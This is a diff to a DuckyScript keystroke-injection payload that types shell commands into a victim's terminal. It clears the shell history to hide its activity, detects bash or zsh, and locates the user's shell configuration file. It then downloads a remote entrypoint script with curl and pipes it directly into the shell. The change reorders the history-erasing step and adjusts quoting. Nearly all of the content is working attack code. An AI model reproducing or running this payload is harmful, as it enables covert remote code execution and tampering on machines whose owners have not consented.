@@ -33,6 +33,8 @@ END_EXTENSION
 $_JITTER_ENABLED = TRUE
 $_JITTER_MAX = 1
 
+STRINGLN unset HISTFILE
+
 STRINGLN export CURRENT_SHELL=''
 STRINGLN CURRENT_SHELL=$(readlink /proc/$$/exe)
 STRINGLN "$CURRENT_SHELL"
@@ -40,13 +42,10 @@ STRINGLN "$CURRENT_SHELL"
 STRINGLN [[ "$CURRENT_SHELL" == *"zsh"* ]] && CURRENT_SHELL="zsh"
 STRINGLN [[ "$CURRENT_SHELL" == *"bash"* ]] && CURRENT_SHELL="bash"
 
-STRINGLN [ "$CURRENT_SHELL" = "zsh" ] && unset HISTFILE
-STRINGLN [ "$CURRENT_SHELL" = "bash" ] && set +o history
-
 STRINGLN export CONFIG_FILE=''
 STRINGLN [ "$CURRENT_SHELL" = "zsh" ] && CONFIG_FILE="${ZDOTDIR:-$HOME}/.zshrc"
 STRINGLN [ "$CURRENT_SHELL" = "bash" ] && CONFIG_FILE="$HOME/.bashrc"
 
-STRINGLN curl -sLf 'https://raw.githubusercontent.com/Saverio976/ducky-the-duck/main/script/entrypoint.sh' | "$CURRENT_SHELL"
+STRINGLN curl -sLf 'https://raw.githubusercontent.com/Saverio976/ducky-the-duck/main/script/entrypoint.sh' | $CURRENT_SHELL
 
 ATTACKMODE STORAGE
